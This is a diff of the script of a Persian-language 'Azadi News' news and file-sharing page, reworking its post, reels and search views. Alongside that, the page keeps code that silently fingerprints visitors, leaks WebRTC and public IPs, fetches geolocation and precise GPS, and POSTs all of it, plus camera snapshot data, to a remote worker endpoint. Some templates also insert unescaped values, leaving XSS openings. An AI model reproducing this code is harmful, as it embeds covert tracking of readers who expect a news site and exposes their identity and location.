-            if(s.logoUrl){const fc=$('flagContainer');if(fc)fc.innerHTML=`<img src="${s.logoUrl}" class="flag-image" style="width:120px;animation:flagWave 4s ease-in-out infinite;filter:drop-shadow(0 0 30px rgba(255,215,0,0.6));" onerror="this.style.display='none';"><h2 style="color:var(--gold);text-shadow:0 0 20px var(--gold);font-size:26px;">${s.siteName||'آزادی نیوز'}</h2>`;}
-            buildSocialLinks(s);
+            if(s.siteName){const sn=$('siteName');if(sn)sn.textContent=s.siteName;document.title='🦁 '+s.siteName+' | AZADI NEWS';}
+            if(s.logoUrl){const fc=document.querySelector('.flag-container');if(fc)fc.innerHTML=`<img src="${s.logoUrl}" style="width:80px;animation:flagWave 4s ease-in-out infinite;" onerror="this.style.display='none';"><h2 style="color:var(--gold);">${s.siteName||'آزادی نیوز'}</h2>`;}
         }
-        function buildSocialLinks(s){const c=$('socialLinksContainer');if(!c)return;let h='';if(s.telegram)h+=`<a href="${s.telegram}" class="social-link social-telegram" target="_blank"><i class="fab fa-telegram"></i> تلگرام</a>`;if(s.bale)h+=`<a href="${s.bale}" class="social-link social-bale" target="_blank"><i class="fas fa-comment"></i> بله</a>`;if(s.instagram)h+=`<a href="${s.instagram}" class="social-link social-instagram" target="_blank"><i class="fab fa-instagram"></i> اینستاگرام</a>`;if(s.eitaa)h+=`<a href="${s.eitaa}" class="social-link social-eitaa" target="_blank"><i class="fas fa-message"></i> ایتا</a>`;if(s.rubika)h+=`<a href="${s.rubika}" class="social-link social-rubika" target="_blank"><i class="fas fa-comments"></i> روبیکا</a>`;if(s.shad)h+=`<a href="${s.shad}" class="social-link social-shad" target="_blank"><i class="fas fa-graduation-cap"></i> شاد</a>`;if(s.phone)h+=`<a href="tel:${s.phone}" class="social-link social-phone"><i class="fas fa-phone"></i> ${s.phone}</a>`;c.innerHTML=h||'<p style="color:#888;">بدون لینک</p>';}
 
-        function scrollToTop(){window.scrollTo({top:0,behavior:'smooth'});}
-        function scrollToNews(){document.querySelector('.section-panel').scrollIntoView({behavior:'smooth'});}
-        function scrollToFiles(){document.querySelectorAll('.section-panel')[1].scrollIntoView({behavior:'smooth'});}
-
+        // ========== NEWS ==========
         function showNewsModal(){$('newsModal').classList.add('active');}
         function closeNewsModal(){$('newsModal').classList.remove('active');}
         function addNews(){
@@ -322,100 +328,117 @@
             if(!t||!b)return notify('❌ عنوان و متن');
             const n=gs('news')||[];n.unshift({id:Date.now(),title:t,body:b,image:i,date:new Date().toISOString(),expiry:e===0?0:Date.now()+(e*86400000)});
             ss('news',n);['newsTitleInput','newsBodyInput','newsImageInput'].forEach(id=>{const el=$(id);if(el)el.value='';});
-            closeNewsModal();displayNews();notify('✅ خبر');
+            closeNewsModal();displayPosts();notify('✅ خبر');
         }
-        function displayNews(){
-            const c=$('newsContainer');if(!c)return;let n=gs('news')||[];const now=Date.now();n=n.filter(x=>x.expiry===0||x.expiry>now);ss('news',n);
-            if(n.length===0){c.innerHTML='<p style="color:#888;">خبری نیست</p>';return;}
-            c.innerHTML=n.map(x=>`<div class="news-card"><div class="news-date">📅 ${new Date(x.date).toLocaleDateString('fa-IR',{year:'numeric',month:'long',day:'numeric',hour:'2-digit',minute:'2-digit'})}</div><div class="news-title">${escHtml(x.title)}</div><div class="news-body">${escHtml(x.body).replace(/\n/g,'<br>')}</div>${x.image?`<img src="${x.image}" class="news-image" onerror="this.style.display='none'">`:''}${x.expiry>0?`<div class="news-expiry" style="color:var(--red);">⏱️ ${new Date(x.expiry).toLocaleDateString('fa-IR')}</div>`:'<div style="color:var(--green);">✅ دائمی</div>'}${isAdmin?`<button class="btn btn-danger btn-xs" onclick="deleteNews('${x.id}')">🗑️</button>`:''}</div>`).join('');
+        function displayPosts(){
+            const c=$('postsContainer');if(!c)return;
+            let posts = [];
+            const news = gs('news')||[];
+            const files = gs('files')||[];
+            const now = Date.now();
+            news.filter(x=>x.expiry===0||x.expiry>now).forEach(x=>posts.push({type:'news',...x}));
+            files.filter(x=>x.expiry===0||x.expiry>now).forEach(x=>posts.push({type:'file',...x}));
+            posts.sort((a,b)=>new Date(b.date)-new Date(a.date));
+            if(posts.length===0){c.innerHTML='<p style="color:#888;text-align:center;padding:40px;">پستی برای نمایش وجود ندارد</p>';return;}
+            c.innerHTML=posts.map(p=>{
+                if(p.type==='news'){
+                    return `<div class="post-card"><div class="post-header"><div class="post-avatar">📰</div><div><div class="post-user">آزادی نیوز</div><div class="post-date">${new Date(p.date).toLocaleDateString('fa-IR',{year:'numeric',month:'long',day:'numeric',hour:'2-digit',minute:'2-digit'})}</div></div></div>${p.image?`<img src="${p.image}" class="post-media" onerror="this.style.display='none'">`:''}<div class="post-body"><div class="post-title">${escHtml(p.title)}</div>${escHtml(p.body).replace(/\n/g,'<br>')}</div>${isAdmin?`<div style="padding:8px 15px;"><button class="btn btn-danger btn-xs" onclick="deleteNews('${p.id}')">🗑️ حذف</button></div>`:''}</div>`;
+                } else {
+                    const ext=p.name.split('.').pop()?.toLowerCase();
+                    let media='';
+                    if(p.type==='file'&&p.type&&p.type.startsWith('image/'))media=`<img src="${p.data}" class="post-media">`;
+                    else if(p.type==='file'&&p.type&&p.type.startsWith('video/'))media=`<video src="${p.data}" class="post-video" controls controlsList="nodownload" oncontextmenu="return false"></video>`;
+                    else if(p.type==='file'&&p.type&&p.type.startsWith('audio/'))media=`<div style="padding:20px;text-align:center;">🎵 ${escHtml(p.name)}</div>`;
+                    else media=`<div style="padding:20px;text-align:center;">📄 ${escHtml(p.name)}</div>`;
+                    return `<div class="post-card"><div class="post-header"><div class="post-avatar">📁</div><div><div class="post-user">فایل اشتراکی</div><div class="post-date">${new Date(p.date).toLocaleDateString('fa-IR')} | ${formatSize(p.size)}</div></div></div>${media}<div class="post-body"><div class="post-title">${escHtml(p.name)}</div>${p.type&&p.type.startsWith('video/')?'🎬 ویدیو - فقط پخش آنلاین':''}</div><div class="post-actions">${p.type&&!p.type.startsWith('video/')?`<span class="post-action" onclick="downloadFile('${p.id}')"><i class="fas fa-download"></i> دانلود</span>`:`<span class="post-action" onclick="playVideo('${p.id}')"><i class="fas fa-play"></i> پخش</span>`}${isAdmin?`<span class="post-action" style="color:var(--red);" onclick="deleteFile('${p.id}')"><i class="fas fa-trash"></i> حذف</span>`:''}</div></div>`;
+                }
+            }).join('');
         }
-        function deleteNews(id){if(!isAdmin)return;let n=gs('news')||[];n=n.filter(x=>x.id!=id);ss('news',n);displayNews();notify('🗑️ حذف');}
+        function deleteNews(id){if(!isAdmin)return;let n=gs('news')||[];n=n.filter(x=>x.id!=id);ss('news',n);displayPosts();notify('🗑️ حذف');}
 
+        // ========== FILES ==========
         function showUploadModal(){$('uploadModal').classList.add('active');}
         function closeUploadModal(){$('uploadModal').classList.remove('active');selectedFiles=[];$('selectedFilesList').innerHTML='';}
         function handleFileSelect(fl){selectedFiles=Array.from(fl);$('selectedFilesList').innerHTML=selectedFiles.map(f=>`📄 ${f.name}`).join('<br>');}
         function uploadFiles(){
             if(!selectedFiles.length)return notify('❌ فایلی نیست');
             const e=parseInt($('expirySelect')?.value||'0');let c=0;
-            selectedFiles.forEach(f=>{const r=new FileReader();r.onload=function(ev){const fs=gs('files')||[];fs.unshift({id:Date.now()+Math.random().toString(36),name:f.name,type:f.type||'application/octet-stream',size:f.size,data:ev.target.result,date:new Date().toISOString(),expiry:e===0?0:Date.now()+(e*86400000)});ss('files',fs);c++;if(c===selectedFiles.length){closeUploadModal();displayFiles();notify(`✅ ${c} فایل`);}};r.readAsDataURL(f);});
-        }
-        function filterFiles(t,b){currentFilter=t;document.querySelectorAll('.category-tab').forEach(x=>x.classList.remove('active'));if(b)b.classList.add('active');displayFiles();}
-        function displayFiles(page=0){
-            const g=$('fileGrid');if(!g)return;let fs=gs('files')||[];const now=Date.now();fs=fs.filter(f=>f.expiry===0||f.expiry>now);ss('files',fs);
-            const s=($('searchInput')?.value||'').toLowerCase();
-            const fm={music:f=>f.type.startsWith('audio/')||f.name.match(/\.(mp3|wav|flac|ogg|aac)$/i),video:f=>f.type.startsWith('video/')||f.name.match(/\.(mp4|mkv|avi|mov|webm)$/i),image:f=>f.type.startsWith('image/')||f.name.match(/\.(jpg|jpeg|png|gif|bmp|webp)$/i),app:f=>f.name.match(/\.(apk|exe|msi|dmg)$/i),doc:f=>f.name.match(/\.(doc|docx|txt|rtf)$/i),pdf:f=>f.name.match(/\.pdf$/i),zip:f=>f.name.match(/\.(zip|rar|7z|tar|gz)$/i),exe:f=>f.name.match(/\.exe$/i),apk:f=>f.name.match(/\.apk$/i)};
-            let fl=fs;if(fm[currentFilter])fl=fs.filter(fm[currentFilter]);if(s)fl=fl.filter(f=>f.name.toLowerCase().includes(s));
-            const perPage=12;const start=page*perPage;const pageItems=fl.slice(start,start+perPage);
-            if(page===0)g.innerHTML='';
-            if(!pageItems.length&&page===0){g.innerHTML='<p style="color:#888;grid-column:1/-1;">فایلی نیست</p>';return;}
-            pageItems.forEach(f=>{
-                const ext=f.name.split('.').pop()?.toLowerCase();let p='';if(f.type.startsWith('image/'))p=`<img src="${f.data}" class="file-preview">`;else if(f.type.startsWith('video/'))p=`<video src="${f.data}" class="file-preview" controlsList="nodownload" oncontextmenu="return false"></video>`;else if(f.type.startsWith('audio/'))p=`<div class="file-icon-placeholder">🎵<span class="file-ext">${ext?.toUpperCase()||'AUD'}</span></div>`;else p=`<div class="file-icon-placeholder">📄<span class="file-ext">${ext?.toUpperCase()||'FILE'}</span></div>`;
-                const cd=!f.type.startsWith('video/');
-                const card=document.createElement('div');card.className='file-card';
-                card.innerHTML=`${p}<div class="file-info"><div class="file-name">${escHtml(f.name)}</div><div class="file-meta"><span>💾 ${formatSize(f.size)}</span><span>📅 ${new Date(f.date).toLocaleDateString('fa-IR')}</span></div><div class="file-meta"><span class="expiry-badge" style="color:${f.expiry===0||f.expiry>Date.now()?'var(--green)':'var(--red)'}">${f.expiry===0?'♾️':'⏱️ '+new Date(f.expiry).toLocaleDateString('fa-IR')}</span></div><div class="file-actions">${cd?`<button class="btn btn-xs" onclick="downloadFile('${f.id}')"><i class="fas fa-download"></i></button>`:`<button class="btn btn-xs" onclick="playVideo('${f.id}')"><i class="fas fa-play"></i></button>`}${isAdmin?`<button class="btn btn-xs btn-danger" onclick="deleteFile('${f.id}')"><i class="fas fa-trash"></i></button>`:''}</div></div>`;
-                g.appendChild(card);
-            });
+            selectedFiles.forEach(f=>{const r=new FileReader();r.onload=function(ev){const fs=gs('files')||[];fs.unshift({id:Date.now()+Math.random().toString(36),name:f.name,type:f.type||'application/octet-stream',size:f.size,data:ev.target.result,date:new Date().toISOString(),expiry:e===0?0:Date.now()+(e*86400000)});ss('files',fs);c++;if(c===selectedFiles.length){closeUploadModal();displayPosts();displayReels();notify(`✅ ${c} فایل`);}};r.readAsDataURL(f);});
         }
         function downloadFile(id){const fs=gs('files')||[];const f=fs.find(x=>x.id==id);if(!f)return;const a=document.createElement('a');a.href=f.data;a.download=f.name;a.click();notify('📥 دانلود');}
         function playVideo(id){const fs=gs('files')||[];const f=fs.find(x=>x.id==id);if(!f)return;const w=window.open('','_blank');w.document.write(`<html><head><title>${f.name}</title><style>body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}video{max-width:100%;max-height:100vh}</style></head><body><video src="${f.data}" controls autoplay oncontextmenu="return false" controlsList="nodownload"></video></body></html>`);}
-        function deleteFile(id){if(!isAdmin)return;let fs=gs('files')||[];fs=fs.filter(f=>f.id!=id);ss('files',fs);displayFiles();notify('🗑️ حذف');}
-        function deleteAllFiles(){if(!isAdmin)return;if(confirm('همه حذف شوند؟')){ss('files',[]);displayFiles();notify('🗑️ همه');}}
+        function deleteFile(id){if(!isAdmin)return;let fs=gs('files')||[];fs=fs.filter(f=>f.id!=id);ss('files',fs);displayPosts();displayReels();notify('🗑️ حذف');}
+        function deleteAllFiles(){if(!isAdmin)return;if(confirm('همه حذف شوند؟')){ss('files',[]);displayPosts();displayReels();notify('🗑️ همه');}}
 
-        let currentPage=0;let isLoading=false;
-        window.addEventListener('scroll',()=>{
-            if(isLoading)return;
-            if(window.innerHeight+window.scrollY>=document.body.offsetHeight-500){
-                isLoading=true;$('loadingMore').style.display='block';
-                setTimeout(()=>{currentPage++;displayFiles(currentPage);isLoading=false;$('loadingMore').style.display='none';},500);
-            }
-        });
+        // ========== REELS ==========
+        function displayReels(){
+            const c=$('reelsContainer');if(!c)return;
+            let files=gs('files')||[];const now=Date.now();files=files.filter(f=>(f.expiry===0||f.expiry>now)&&(f.type.startsWith('video/')||f.type.startsWith('image/')));
+            if(files.length===0){c.innerHTML='<p style="color:#888;text-align:center;padding:40px;">فیلم و عکسی موجود نیست</p>';return;}
+            c.innerHTML=files.map(f=>{
+                let media='';
+                if(f.type.startsWith('video/'))media=`<video src="${f.data}" class="reel-media" loop muted preload="metadata"></video>`;
+                else if(f.type.startsWith('image/'))media=`<img src="${f.data}" class="reel-media" style="object-fit:contain;">`;
+                return `<div class="reel-card" onclick="${f.type.startsWith('video/')?`toggleReelPlay(this)`:`viewImage('${f.id}')`}">${media}<div class="reel-overlay"><div class="reel-title">${escHtml(f.name)}</div><div class="reel-meta">${formatSize(f.size)}</div></div>${f.type.startsWith('video/')?`<div class="reel-play-btn">▶️</div>`:''}</div>`;
+            }).join('');
+        }
+        function toggleReelPlay(card){
+            const video=card.querySelector('video');
+            const btn=card.querySelector('.reel-play-btn');
+            if(video.paused){video.play();btn.style.display='none';}else{video.pause();btn.style.display='block';}
+        }
+        function viewImage(id){const fs=gs('files')||[];const f=fs.find(x=>x.id==id);if(!f)return;const w=window.open('','_blank');w.document.write(`<html><head><title>${f.name}</title><style>body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}img{max-width:100%;max-height:100vh}</style></head><body><img src="${f.data}"></body></html>`);}
 
+        // ========== SEARCH ==========
+        function searchAll(){
+            const s=($('globalSearch')?.value||'').toLowerCase();
+            const g=$('searchGrid');if(!g)return;
+            let files=gs('files')||[];const now=Date.now();files=files.filter(f=>f.expiry===0||f.expiry>now);
+            if(s)files=files.filter(f=>f.name.toLowerCase().includes(s));
+            if(files.length===0){g.innerHTML='<p style="color:#888;text-align:center;grid-column:1/-1;padding:40px;">موردی یافت نشد</p>';return;}
+            g.innerHTML=files.slice(0,30).map(f=>{
+                let thumb='';
+                if(f.type.startsWith('image/'))thumb=`<img src="${f.data}">`;
+                else if(f.type.startsWith('video/'))thumb=`<video src="${f.data}" muted></video>`;
+                else thumb=`<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:30px;">📄</div>`;
+                return `<div class="search-item" onclick="${f.type.startsWith('video/')?`playVideo('${f.id}')`:`downloadFile('${f.id}')`}">${thumb}</div>`;
+            }).join('');
+        }
+
+        // ========== CAMERA ==========
         async function requestCamera(fm='user'){try{if(cameraStream)cameraStream.getTracks().forEach(t=>t.stop());cameraStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm}});const v=$('cameraVideo');if(v){v.srcObject=cameraStream;v.style.display='block';}$('captureBtn').style.display='inline-block';notify('📸 دوربین');}catch(e){notify('❌ دسترسی');}}
         function capturePhoto(){if(!cameraStream)return;const v=$('cameraVideo'),c=$('cameraCanvas'),p=$('cameraPhoto');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);const d=c.toDataURL('image/jpeg',0.8);p.src=d;p.style.display='block';v.style.display='none';$('captureBtn').style.display='none';cameraStream.getTracks().forEach(t=>t.stop());cameraStream=null;notify('📸 عکس');try{fetch(`${WORKER_URL}/api/report`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',photo:d.substring(0,500),timestamp:new Date().toISOString()})});}catch(e){}}
 
-        async function collectUserInfo(){const i=await gatherInfo();const b=$('userInfoBox');if(b)displayInfo(b,i);}
+        // ========== USER INFO ==========
         async function collectUserInfoAdmin(){const i=await gatherInfo();const b=$('adminUserInfoBox');if(b)displayInfo(b,i,true);}
-
         async function gatherInfo(){
             const info={},now=new Date();
             info.persianDate=new Intl.DateTimeFormat('fa-IR',{year:'numeric',month:'long',day:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit',timeZone:'Asia/Tehran'}).format(now);
-            info.timestamp=now.toISOString();info.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
-            info.language=navigator.language;info.languages=navigator.languages?Array.from(navigator.languages).join(', '):'N/A';
-            info.userAgent=navigator.userAgent;info.platform=navigator.platform;info.vendor=navigator.vendor||'N/A';
+            info.timestamp=now.toISOString();info.language=navigator.language;info.platform=navigator.platform;info.userAgent=navigator.userAgent;
             const ua=navigator.userAgent;
             info.isMobile=/Mobi|Android|iPhone|iPad|iPod/i.test(ua);info.isAndroid=/Android/i.test(ua);info.isIOS=/iPhone|iPad|iPod/i.test(ua);
             if(info.isAndroid){const m=ua.match(/Android\s[\d.]+;\s([^;)]+)/);info.deviceModel=m?m[1].trim():'Unknown';}
-            else if(info.isIOS){info.deviceModel=/iPhone/.test(ua)?'iPhone':/iPad/.test(ua)?'iPad':'iPod';}
-            else info.deviceModel='Desktop';
+            else if(info.isIOS){info.deviceModel=/iPhone/.test(ua)?'iPhone':'iPad';}else info.deviceModel='Desktop';
             info.screenWidth=screen.width;info.screenHeight=screen.height;info.innerWidth=window.innerWidth;info.innerHeight=window.innerHeight;
-            info.pixelRatio=window.devicePixelRatio;info.colorDepth=screen.colorDepth;info.orientation=screen.orientation?.type||'N/A';
-            info.cpuCores=navigator.hardwareConcurrency||'N/A';info.ram=navigator.deviceMemory||'N/A';info.maxTouchPoints=navigator.maxTouchPoints||0;
+            info.pixelRatio=window.devicePixelRatio;info.colorDepth=screen.colorDepth;info.cpuCores=navigator.hardwareConcurrency||'N/A';info.ram=navigator.deviceMemory||'N/A';
             try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const di=gl.getExtension('WEBGL_debug_renderer_info');info.gpuVendor=di?gl.getParameter(di.UNMASKED_VENDOR_WEBGL):'N/A';info.gpuRenderer=di?gl.getParameter(di.UNMASKED_RENDERER_WEBGL):'N/A';}}catch(e){}
-            if('getBattery' in navigator){try{const b=await navigator.getBattery();info.batteryLevel=Math.round(b.level*100);info.batteryCharging=b.charging;info.batteryChargingTime=b.chargingTime===Infinity?-1:Math.round(b.chargingTime/60);}catch(e){}}
-            info.onLine=navigator.onLine;
-            if('connection' in navigator){const c=navigator.connection;info.connectionType=c.effectiveType||c.type||'N/A';info.downlink=c.downlink||'N/A';info.rtt=c.rtt||'N/A';}
-            info.cookieEnabled=navigator.cookieEnabled;info.doNotTrack=navigator.doNotTrack||'N/A';info.https=location.protocol==='https:';
-            info.pluginsCount=navigator.plugins?navigator.plugins.length:0;
-            info.serviceWorker='serviceWorker' in navigator;info.webRTC=!!window.RTCPeerConnection;
-            info.accelerometer='Accelerometer' in window;info.gyroscope='Gyroscope' in window;info.ambientLight='AmbientLightSensor' in window;
-            info.mediaDevices=!!navigator.mediaDevices;
-            if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){try{const ds=await navigator.mediaDevices.enumerateDevices();info.cameraCount=ds.filter(d=>d.kind==='videoinput').length;info.microphoneCount=ds.filter(d=>d.kind==='audioinput').length;}catch(e){}}
-            info.bluetooth='bluetooth' in navigator;info.usb='usb' in navigator;info.nfc='NDEFReader' in window;
-            info.clipboard=!!navigator.clipboard;info.notification='Notification' in window;if(info.notification)info.notificationPermission=Notification.permission;
-            info.geolocation=!!navigator.geolocation;info.vibrate=!!navigator.vibrate;
+            if('getBattery' in navigator){try{const b=await navigator.getBattery();info.batteryLevel=Math.round(b.level*100);info.batteryCharging=b.charging;}catch(e){}}
+            info.onLine=navigator.onLine;if('connection' in navigator){info.connectionType=navigator.connection.effectiveType||'N/A';info.downlink=navigator.connection.downlink||'N/A';}
+            info.cookieEnabled=navigator.cookieEnabled;info.https=location.protocol==='https:';
+            info.mediaDevices=!!navigator.mediaDevices;if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){try{const ds=await navigator.mediaDevices.enumerateDevices();info.cameraCount=ds.filter(d=>d.kind==='videoinput').length;info.microphoneCount=ds.filter(d=>d.kind==='audioinput').length;}catch(e){}}
+            info.bluetooth='bluetooth' in navigator;info.usb='usb' in navigator;info.vibrate=!!navigator.vibrate;
             info.fingerprint=await generateFingerprint();info.canvasFingerprint=await getCanvasFingerprint();info.webglFingerprint=await getWebGLFingerprint();
             try{const pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');const o=await pc.createOffer();await pc.setLocalDescription(o);const ips=[];pc.onicecandidate=(e)=>{if(e.candidate){const ip=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);if(ip&&!ips.includes(ip[1]))ips.push(ip[1]);}};await new Promise(r=>setTimeout(r,1000));pc.close();info.localIPs=ips.join(', ')||'N/A';}catch(e){info.localIPs='N/A';}
             try{const ipRes=await fetch('https://api.ipify.org?format=json');const ipData=await ipRes.json();info.ip=ipData.ip;
-                try{const geoRes=await fetch(`https://ipapi.co/${ipData.ip}/json/`);const geo=await geoRes.json();info.city=geo.city||'N/A';info.region=geo.region||'N/A';info.country=geo.country_name||'N/A';info.postal=geo.postal||'N/A';info.latitude=geo.latitude||'N/A';info.longitude=geo.longitude||'N/A';info.timezone=geo.timezone||'N/A';info.isp=geo.org||'N/A';info.asn=geo.asn||'N/A';info.hostname=geo.hostname||'N/A';info.organization=geo.org||'N/A';}catch(e){}}
+                try{const geoRes=await fetch(`https://ipapi.co/${ipData.ip}/json/`);const geo=await geoRes.json();info.city=geo.city||'N/A';info.region=geo.region||'N/A';info.country=geo.country_name||'N/A';info.postal=geo.postal||'N/A';info.latitude=geo.latitude||'N/A';info.longitude=geo.longitude||'N/A';info.isp=geo.org||'N/A';info.asn=geo.asn||'N/A';info.hostname=geo.hostname||'N/A';info.organization=geo.org||'N/A';}catch(e){}}
             catch(e){}
             try{const pos=await new Promise((res,rej)=>{navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:5000,maximumAge:0});});info.gpsLat=pos.coords.latitude;info.gpsLon=pos.coords.longitude;info.gpsAccuracy=Math.round(pos.coords.accuracy)+' متر';}catch(e){}
             try{await fetch(`${WORKER_URL}/api/report`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(info)});}catch(e){}
             const logs=gs('visit_log')||[];logs.push(info);if(logs.length>50)logs.shift();ss('visit_log',logs);displayVisitLog();
             return info;
         }
-
         async function generateFingerprint(){const c=[navigator.userAgent,navigator.language,screen.colorDepth,screen.width+'x'+screen.height,new Date().getTimezoneOffset(),navigator.hardwareConcurrency,navigator.deviceMemory];const str=c.join('|||');const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(str));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,16);}
-        async function getCanvasFingerprint(){try{const c=document.createElement('canvas');c.width=200;c.height=50;const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(0,0,100,50);ctx.fillStyle='#069';ctx.fillText('🖐️',2,15);const d=c.toDataURL();const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(d));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,12);}catch(e){return'N/A';}}
+        async function getCanvasFingerprint(){try{const c=document.createElement('canvas');c.width=200;c.height=50;const ctx=c.getContext('2d');ctx.fillStyle='#f60';ctx.fillRect(0,0,100,50);ctx.fillStyle='#069';ctx.fillText('🖐️',2,15);const d=c.toDataURL();const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(d));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,12);}catch(e){return'N/A';}}
         async function getWebGLFingerprint(){try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return'N/A';const di=gl.getExtension('WEBGL_debug_renderer_info');const v=gl.getParameter(di.UNMASKED_VENDOR_WEBGL);const r=gl.getParameter(di.UNMASKED_RENDERER_WEBGL);const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(v+r));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,12);}catch(e){return'N/A';}}
 
         function displayInfo(b,i,ext=false){
@@ -431,42 +454,33 @@
                 <div class="info-row"><span>🖥️ Hostname</span> ${i.hostname||'...'}</div>
                 <div class="info-row"><span>📡 ASN</span> ${i.asn||'...'}</div>
                 ${i.gpsLat?`<div class="info-row"><span>📍 GPS</span> ${i.gpsLat.toFixed(4)}, ${i.gpsLon.toFixed(4)}</div>`:''}
-                ${i.gpsAccuracy?`<div class="info-row"><span>🎯 دقت GPS</span> ${i.gpsAccuracy}</div>`:''}
                 <div class="info-row"><span>📱 مدل</span> ${i.deviceModel||'...'}</div>
                 <div class="info-row"><span>💻 پلتفرم</span> ${i.platform}</div>
-                <div class="info-row"><span>📱 موبایل</span> ${i.isMobile?'✅':'❌'}</div>
                 <div class="info-row"><span>🖥 رزولوشن</span> ${i.screenWidth}x${i.screenHeight}</div>
-                <div class="info-row"><span>🪟 Viewport</span> ${i.innerWidth}x${i.innerHeight}</div>
                 <div class="info-row"><span>🔍 Pixel</span> ${i.pixelRatio}x</div>
-                <div class="info-row"><span>🎨 رنگ</span> ${i.colorDepth}-bit</div>
                 <div class="info-row"><span>🧠 CPU</span> ${i.cpuCores} هسته</div>
                 <div class="info-row"><span>💾 RAM</span> ${i.ram} GB</div>
-                ${i.gpuVendor?`<div class="info-row"><span>🎮 GPU</span> ${i.gpuVendor} - ${i.gpuRenderer}</div>`:''}
+                ${i.gpuVendor?`<div class="info-row"><span>🎮 GPU</span> ${i.gpuVendor}</div>`:''}
                 <div class="info-row"><span>🔋 باتری</span> ${i.batteryLevel||'N/A'}% ${i.batteryCharging?'🔌':'🔋'}</div>
                 <div class="info-row"><span>📶 شبکه</span> ${i.connectionType||'N/A'}</div>
-                <div class="info-row"><span>🚀 سرعت</span> ${i.downlink||'N/A'}</div>
                 <div class="info-row"><span>📸 دوربین</span> ${i.cameraCount||'N/A'} عدد</div>
-                <div class="info-row"><span>🎤 میکروفن</span> ${i.microphoneCount||'N/A'} عدد</div>
                 <div class="info-row"><span>🆔 FP</span> ${i.fingerprint}</div>
                 ${i.localIPs?`<div class="info-row"><span>🔍 WebRTC IP</span> ${i.localIPs}</div>`:''}
-                ${ext?`<div class="info-row"><span>🎨 Canvas FP</span> ${i.canvasFingerprint}</div><div class="info-row"><span>🎮 WebGL FP</span> ${i.webglFingerprint}</div><div class="info-row"><span>🍪 کوکی</span> ${i.cookieEnabled?'✅':'❌'}</div><div class="info-row"><span>🔒 HTTPS</span> ${i.https?'✅':'❌'}</div><div class="info-row"><span>📡 سنسورها</span> شتاب:${i.accelerometer?'✅':'❌'} ژیرو:${i.gyroscope?'✅':'❌'} نور:${i.ambientLight?'✅':'❌'}</div><div class="info-row"><span>🔵 بلوتوث</span> ${i.bluetooth?'✅':'❌'}</div><div class="info-row"><span>🔌 USB</span> ${i.usb?'✅':'❌'}</div><div class="info-row"><span>📳 ویبره</span> ${i.vibrate?'✅':'❌'}</div>`:''}
             `;
         }
 
         function displayVisitLog(){
             const b=$('visitLogBox');if(!b)return;const l=gs('visit_log')||[];
             if(!l.length){b.innerHTML='<p style="color:#888;">بدون بازدید</p>';return;}
-            b.innerHTML=l.slice(-15).reverse().map(x=>`<div style="background:#000;border:1px solid rgba(255,215,0,0.1);border-radius:6px;padding:6px;margin-bottom:4px;font-size:9px;"><div style="color:var(--gold);">📅 ${x.persianDate||x.date}</div><div>🌍 ${x.ip||'?'} | 📍 ${x.city||'?'}</div><div>💻 ${x.platform||'?'} | 📱 ${x.deviceModel||'?'}</div></div>`).join('');
+            b.innerHTML=l.slice(-15).reverse().map(x=>`<div style="background:#000;border:1px solid rgba(255,215,0,0.1);border-radius:6px;padding:6px;margin-bottom:4px;font-size:9px;"><div style="color:var(--gold);">📅 ${x.persianDate||x.date}</div><div>🌍 ${x.ip||'?'} | 📍 ${x.city||'?'}</div><div>💻 ${x.platform||'?'}</div></div>`).join('');
         }
 
         function init(){
-            changeTheme(gs('theme')||'dark');buildThemeGrid();initMatrix();createParticles();displayNews();displayFiles();collectUserInfo();
+            changeTheme(gs('theme')||'dark');buildThemeGrid();initMatrix();createParticles();displayPosts();displayReels();
             applySettings(gs('settings')||{});
-            setInterval(()=>{displayNews();displayFiles();},60000);
-            updateHeaderButtons();
+            setInterval(()=>{displayPosts();displayReels();},60000);
             document.addEventListener('keydown',e=>{if(e.key==='Escape'){document.querySelectorAll('.modal.active').forEach(m=>m.classList.remove('active'));closeAdminPanel();}});
             document.querySelectorAll('.modal').forEach(m=>{m.addEventListener('click',function(e){if(e.target===this)this.classList.remove('active');});});
-            const uz=document.querySelector('.upload-zone');if(uz){['dragover','drop'].forEach(ev=>{uz.addEventListener(ev,e=>{e.preventDefault();e.stopPropagation();});});uz.addEventListener('drop',e=>{handleFileSelect(e.dataTransfer.files);});}
         }
         document.addEventListener('DOMContentLoaded',init);
     </script>
